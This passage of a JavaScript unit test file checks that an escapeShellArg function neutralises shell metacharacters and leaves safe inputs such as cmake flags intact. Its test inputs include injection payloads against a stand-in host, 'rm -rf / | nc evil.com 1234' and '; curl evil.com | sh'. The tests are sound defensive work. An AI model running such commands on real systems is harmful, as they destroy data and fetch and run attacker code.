        assert.equal(result, '\\]');
    });

    it('escapes open brace', () => {
        // Attack: cmd {a,b,c} → brace expansion generates multiple arguments
        // from a single input, altering the command's argument list.
        const result = escapeShellArg('{');
        assert.equal(result, '\\{');
    });

    it('escapes close brace', () => {
        // Paired with open brace for brace expansion injection.
        const result = escapeShellArg('}');
        assert.equal(result, '\\}');
    });

    it('escapes tilde', () => {
        // Attack: cmd ~/file → ~ expands to $HOME, leaking the home directory
        // path and potentially targeting unintended file locations.
        const result = escapeShellArg('~');
        assert.equal(result, '\\~');
    });

    // ── $( ) command substitution ────────────────────────────────────────────
    it('escapes $() command substitution', () => {
        // Attack: cmd $(whoami) → shell executes whoami and substitutes output.
        const result = escapeShellArg('$(whoami)');
        assert.ok(!result.match(/(?<!\\)\$\(/),
            `Unescaped $( found. Got: ${result}`);
    });

    // ── Compound payloads (shell-verified) ───────────────────────────────────
    it('escapes compound injection payload', () => {
        // Attack: combines semicolon, pipe, background, $(), backtick, and
        // redirection — all must be escaped to prevent any code execution.
        const input = "val; rm -rf / | nc evil.com 1234 & $(whoami) `id` > /tmp/out";
        const result = escapeShellArg(input);
        assert.ok(!result.match(/(?<!\\);/), `Unescaped ; found`);
        assert.ok(!result.match(/(?<!\\)\|/), `Unescaped | found`);
        assert.ok(!result.match(/(?<!\\)&/), `Unescaped & found`);
        assert.ok(!result.match(/(?<!\\)\$\(/), `Unescaped $( found`);
        assert.ok(!result.match(/(?<!\\)`/), `Unescaped backtick found`);
        assert.ok(!result.match(/(?<!\\)>/), `Unescaped > found`);
    });

    it('escapes cmake-like payload with injection and env vars preserved', () => {
        // Real-world scenario: cmake configure flags where an attacker injects
        // ; curl evil.com | sh after a legitimate -D flag.
        // The $INSTALL_DIR env var reference must be preserved.
        const input = '.. -DCMAKE_INSTALL_PREFIX=$INSTALL_DIR; curl evil.com | sh';
        const result = escapeShellArg(input);
        assert.ok(result.includes('$INSTALL_DIR'), `$INSTALL_DIR should be preserved`);
        assert.ok(!result.match(/(?<!\\);/), `Unescaped ; found`);
        assert.ok(!result.match(/(?<!\\)\|/), `Unescaped | found`);
    });

    it('escapes path with spaces and special chars', () => {
        // Spaces cause word splitting; single quote enables quote breakout.
        const input = '/path/to/my files/it\'s here';
        const result = escapeShellArg(input);
        assert.ok(!result.match(/(?<!\\) /), `Unescaped space found`);
        assert.ok(!result.match(/(?<!\\)'/), `Unescaped quote found`);
    });

    // ── Safe content must pass through without mangling ─────────────────────
    it('handles real-world cmake flags without mangling', () => {
        const input = '-DCMAKE_BUILD_TYPE=Release';
        assert.equal(escapeShellArg(input), input);
    });

    it('handles dotted path without mangling', () => {
        const input = '../build/output';
        assert.equal(escapeShellArg(input), input);
    });

    it('handles numeric values without mangling', () => {
        const input = '12345';
        assert.equal(escapeShellArg(input), input);
    });

    it('handles equals sign without mangling', () => {
        const input = 'KEY=VALUE';
        assert.equal(escapeShellArg(input), input);
    });

    it('handles comma-separated values without mangling', () => {
        const input = 'a,b,c';
        assert.equal(escapeShellArg(input), input);
    });

    it('handles colon-separated paths without mangling', () => {
        const input = '/usr/bin:/usr/local/bin';
        assert.equal(escapeShellArg(input), input);
    });

    it('handles at-sign without mangling', () => {
        const input = 'user@host';
        assert.equal(escapeShellArg(input), input);
    });

    it('handles percent sign without mangling', () => {
        const input = '100%';
        assert.equal(escapeShellArg(input), input);
    });

    it('handles plus and minus without mangling', () => {
        // The + is safe; no mangling expected.
        const input = '-O2 -std=c++17';
        assert.equal(escapeShellArg(input), input);
    });

    it('handles unicode without mangling', () => {
        // Multi-byte UTF-8 characters must pass through unaltered.
        const input = '日本語パス';
        assert.equal(escapeShellArg(input), input);
    });
}
